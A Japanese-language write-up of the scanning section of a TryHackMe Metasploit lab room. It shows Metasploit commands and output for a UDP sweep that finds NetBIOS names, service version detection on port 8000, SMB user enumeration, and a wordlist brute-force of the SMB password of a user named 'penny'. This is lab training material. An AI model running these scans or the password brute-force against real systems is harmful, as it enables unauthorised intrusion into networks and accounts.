# Write Up  

* https://tryhackme.com/room/metasploitexploitation#
<br>
## Scanning
---  
<br>

--- 


* ### Using the relevant scanner, what NetBIOS name can you see?  
metasploitのscannerを使ってNetBIOSの名前を探る。  
そももそも、どうしてNetBiOSを探ろうとしたのかってめっちゃ気になるじゃん。  

```
msf5 auxiliary(scanner/discovery/udp_sweep) > exploit -z

[*] Sending 13 probes to 10.10.251.114->10.10.251.114 (1 hosts)
[*] Discovered NetBIOS on 10.10.251.114:137 (ACME IT SUPPORT:<00>:G :ACME IT SUPPORT:<1e>:G :IP-10-10-251-11:<00>:U :IP-10-10-251-11:<03>:U :IP-10-10-251-11:<20>:U :00:00:00:00:00:00)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```  
udpのサービスをエクスプロイトしたいと思ったとして、  
上記モジュールを実行した。  
すると、NetBIOSがヒットしたため。  
こちらの情報を調べることにした。  

<br>

---

* ### What is running on port 8000?  
http_versionを使用。  
portscanの結果、tcpでどのportが開いてるかはわかったのでそのサービスが知りたい。
```
//nmapの結果(略)
8000/tcp open  http-alt
```  
これ何が動いてるのかなあって時にhtp_versionを使用。  

```
// RPORTを8000にセット
set RPORT 8000
```  
--- 

* ### What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.  
smbのユーザーとpasswordの情報を知りたい時。  

```
//smbユーザーの列挙
use auxiliary/scanner/smb/smb_enumusers 
```
このモジュールの実行で、userがpennyということはわかる。  
総当たりでpennyのパスワードを調べる。  

```
set SMBUser penny
set DB_ALL_PASS true
set BLANK_PASSWORDS true
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
setg RHOSTS <TARGETIP>
exploit -z
```

次どんな手を打とうかとなった時、searchコマンドでエクスプロイトできそうなサービスを調べてみると良い。  
